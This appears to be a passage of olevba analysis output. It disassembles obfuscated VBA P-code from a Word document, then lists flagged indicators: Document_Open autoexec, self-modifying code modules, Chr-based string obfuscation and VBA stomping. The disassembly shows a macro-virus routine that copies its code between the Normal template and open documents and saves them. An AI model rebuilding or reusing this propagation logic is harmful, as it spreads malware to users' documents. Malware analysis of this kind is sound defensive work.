' 	Add 
' 	Ld WGNGANY 
' 	LitStr 0x0002 "EF"
' 	LitDI2 0x0012 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	ArgsLd FFYRFQW 0x0001 
' 	FnInStr3 
' 	LitDI2 0x0001 
' 	Add 
' 	St VUXPTWE 
' Line #98:
' 	Ld WGNGANY 
' 	Ld VUXPTWE 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld VUXPTWE 
' 	Ld WGNGANY 
' 	LitStr 0x0001 ")"
' 	FnInStr3 
' 	Ld VUXPTWE 
' 	Sub 
' 	LitStr 0x0001 "="
' 	LitDI2 0x000C 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	St UYKIWXN 
' Line #99:
' 	Ld TIHYSCY 
' 	LitStr 0x0001 "?"
' 	LitDI2 0x000E 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	Ne 
' 	DoWhile 
' Line #100:
' 	Ld Timer 
' 	Paren 
' 	ArgsCall Read 0x0001 
' Line #101:
' 	Ld Rnd 
' 	LitStr 0x0002 "55"
' 	LitDI2 0x0003 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	Mul 
' 	FnFix 
' 	LitStr 0x0001 "4"
' 	LitDI2 0x0003 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	Add 
' 	St SRZUWSE 
' Line #102:
' 	Ld WGNGANY 
' 	Ld XCZOWFP 
' 	LitDI2 0x0000 
' 	ArgsLd EUDWYLF 0x0001 
' 	FnLen 
' 	Add 
' 	LitStr 0x0001 "F"
' 	LitDI2 0x0014 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	Add 
' 	Ld XCZOWFP 
' 	LitDI2 0x0000 
' 	ArgsLd EUDWYLF 0x0001 
' 	FnLen 
' 	Add 
' 	LitDI2 0x0002 
' 	Add 
' 	Ld WGNGANY 
' 	LitDI2 0x0022 
' 	ArgsLd FFYRFQW 0x0001 
' 	FnInStr3 
' 	Ld XCZOWFP 
' 	Sub 
' 	LitDI2 0x0000 
' 	ArgsLd EUDWYLF 0x0001 
' 	FnLen 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St WZINHXV 
' Line #103:
' 	LitDI2 0x0001 
' 	St TIHYSCY 
' Line #104:
' 	StartForVariable 
' 	Ld BCHSQEF 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld WZINHXV 
' 	FnLen 
' 	For 
' Line #105:
' 	Ld WZINHXV 
' 	Ld BCHSQEF 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Ld UYKIWXN 
' 	ArgsLd GALGBIN 0x0002 
' 	Ld SRZUWSE 
' 	ArgsLd GALGBIN 0x0002 
' 	LitStr 0x0001 ")"
' 	Eq 
' 	Ld WZINHXV 
' 	Ld BCHSQEF 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Ld UYKIWXN 
' 	ArgsLd GALGBIN 0x0002 
' 	Ld SRZUWSE 
' 	ArgsLd GALGBIN 0x0002 
' 	LitStr 0x0001 """
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St TIHYSCY 
' 	BoS 0x00A1 
' 	ExitFor 
' 	EndIf 
' Line #106:
' 	StartForVariable 
' 	Next 
' Line #107:
' 	Loop 
' Line #108:
' 	Ld WGNGANY 
' 	Ld XCZOWFP 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound$ 0x0002 
' 	LitDI2 0x0000 
' 	ArgsLd EBKIUFR 0x0001 
' 	Add 
' 	LitStr 0x0002 "(""
' 	Add 
' 	Ld WGNGANY 
' 	Ld XCZOWFP 
' 	LitDI2 0x0000 
' 	ArgsLd EUDWYLF 0x0001 
' 	FnLen 
' 	Add 
' 	LitDI2 0x0002 
' 	Add 
' 	Ld XCZOWFP 
' 	LitDI2 0x0000 
' 	ArgsLd EUDWYLF 0x0001 
' 	FnLen 
' 	Add 
' 	LitDI2 0x0002 
' 	Add 
' 	Ld WGNGANY 
' 	LitDI2 0x0022 
' 	ArgsLd FFYRFQW 0x0001 
' 	FnInStr3 
' 	Ld XCZOWFP 
' 	Sub 
' 	LitDI2 0x0000 
' 	ArgsLd EUDWYLF 0x0001 
' 	FnLen 
' 	Sub 
' 	LitDI2 0x0002 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	Ld UYKIWXN 
' 	ArgsLd GALGBIN 0x0002 
' 	Ld SRZUWSE 
' 	ArgsLd GALGBIN 0x0002 
' 	Concat 
' 	LitStr 0x0004 "", -"
' 	Concat 
' 	Ld SRZUWSE 
' 	ArgsLd Str 0x0001 
' 	ArgsLd Trim 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld WGNGANY 
' 	Ld WGNGANY 
' 	FnLen 
' 	Ld XCZOWFP 
' 	LitDI2 0x0000 
' 	ArgsLd EUDWYLF 0x0001 
' 	FnLen 
' 	Add 
' 	LitDI2 0x0002 
' 	Add 
' 	Ld WGNGANY 
' 	LitStr 0x0001 ")"
' 	FnInStr3 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	Concat 
' 	St WGNGANY 
' Line #109:
' 	Loop 
' Line #110:
' 	StartForVariable 
' 	Ld HZQRBPS 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld RHJTHJQ 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #111:
' 	Ld WGNGANY 
' 	Ld HZQRBPS 
' 	ArgsLd EUDWYLF 0x0001 
' 	FnInStr 
' 	LitStr 0x0001 "C"
' 	LitDI2 0x0013 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	Ne 
' 	DoWhile 
' Line #112:
' 	Ld WGNGANY 
' 	Ld HZQRBPS 
' 	ArgsLd EUDWYLF 0x0001 
' 	FnInStr 
' 	St XCZOWFP 
' Line #113:
' 	Ld WGNGANY 
' 	Ld XCZOWFP 
' 	LitStr 0x0001 "3"
' 	LitDI2 0x0002 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	Sub 
' 	ArgsLd LBound$ 0x0002 
' 	Ld HZQRBPS 
' 	ArgsLd EBKIUFR 0x0001 
' 	Add 
' 	Ld WGNGANY 
' 	Ld WGNGANY 
' 	FnLen 
' 	Ld HZQRBPS 
' 	ArgsLd EUDWYLF 0x0001 
' 	FnLen 
' 	Sub 
' 	Ld XCZOWFP 
' 	Sub 
' 	LitStr 0x0001 "3"
' 	LitDI2 0x0002 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	Add 
' 	ArgsLd Right$ 0x0002 
' 	Add 
' 	St WGNGANY 
' Line #114:
' 	Loop 
' Line #115:
' 	StartForVariable 
' 	Next 
' Line #116:
' 	Ld WGNGANY 
' 	St VBDCHQX 
' Line #117:
' 	EndFunc 
' Line #118:
' 	FuncDefn (Private Function GALGBIN(ZVTZIPA, UYKIWXN, id_FFFE As String) As String)
' Line #119:
' 	StartForVariable 
' 	Ld HZQRBPS 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ZVTZIPA 
' 	FnLen 
' 	For 
' Line #120:
' 	Ld GALGBIN 
' 	Ld ZVTZIPA 
' 	Ld HZQRBPS 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Ld UYKIWXN 
' 	Add 
' 	ArgsLd FFYRFQW 0x0001 
' 	Concat 
' 	St GALGBIN 
' Line #121:
' 	StartForVariable 
' 	Next 
' Line #122:
' 	EndFunc 
' Line #123:
' 	FuncDefn (Private Function FFYRFQW(TAFXWQQ, id_FFFE As String) As String)
' Line #124:
' 	Ld TAFXWQQ 
' 	ArgsLd Chr 0x0001 
' 	St FFYRFQW 
' Line #125:
' 	EndFunc 
' Line #126:
' 	FuncDefn (Private Function EIOCMCO(id_FFFE As Variant))
' Line #127:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	ArgsLd NGCGVBB 0x0001 
' 	Set XCZOWFP 
' Line #128:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	ArgsLd NGCGVBB 0x0001 
' 	Set BCHSQEF 
' Line #129:
' 	Ld XCZOWFP 
' 	MemLd CountOfLines 
' 	LitStr 0x0001 "9"
' 	LitDI2 0x0009 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	Eq 
' 	IfBlock 
' Line #130:
' 	LitStr 0x0001 "9"
' 	LitDI2 0x0008 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	LitStr 0x0001 "9"
' 	LitDI2 0x0008 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	Ld BCHSQEF 
' 	MemLd CountOfLines 
' 	Ld BCHSQEF 
' 	ArgsMemLd Lines 0x0002 
' 	Ld XCZOWFP 
' 	ArgsMemCall insertlines 0x0002 
' Line #131:
' 	EndIfBlock 
' Line #132:
' 	Ld BCHSQEF 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #133:
' 	LitStr 0x0001 "C"
' 	LitDI2 0x0012 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0001 
' 	Ld XCZOWFP 
' 	MemLd CountOfLines 
' 	Ld XCZOWFP 
' 	ArgsMemLd Lines 0x0002 
' 	Ld BCHSQEF 
' 	ArgsMemCall insertlines 0x0002 
' Line #134:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitStr 0x0008 "Ithzrjsy"
' 	LitDI2 0x0005 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	FnInStr 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #135:
' 	EndIfBlock 
' Line #136:
' 	EndFunc 
' Line #137:
' 	FuncDefn (Private Function NGCGVBB(TAFXWQQ, id_FFFE As Variant))
' Line #138:
' 	SetStmt 
' 	LitStr 0x0001 "@"
' 	LitDI2 0x000F 
' 	UMi 
' 	ArgsLd GALGBIN 0x0002 
' 	ArgsLd Val 0x0001 
' 	Ld TAFXWQQ 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set NGCGVBB 
' Line #139:
' 	EndFunc 
' Line #140:
' 	QuoteRem 0x0000 0x0109 "GALGBIN-FFYRFQW-EUDWYLF-EBKIUFR-USYZHSS-XCZOWFP-ZWRHLLL-NGCGVBB-JLMIVCY-RHJTHJQ-WGNGANY-YMDLEGT-GMJSRCN-ZVTZIPA-UYKIWXN-YAEZPTU-TVHKODK-JRTUQDK-HZQRBPS-ZXOVIIV-AGUETGO-BPURASD-VBDCHQX-BCHSQEF-WZINHXV-VUXPTWE-SRZUWSE-TIHYSCY-TAFXWQQ-EIOCMCO-XDXWSCA-MDJMKQY-ZJKPBRG-*"
' Line #141:
' Line #142:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

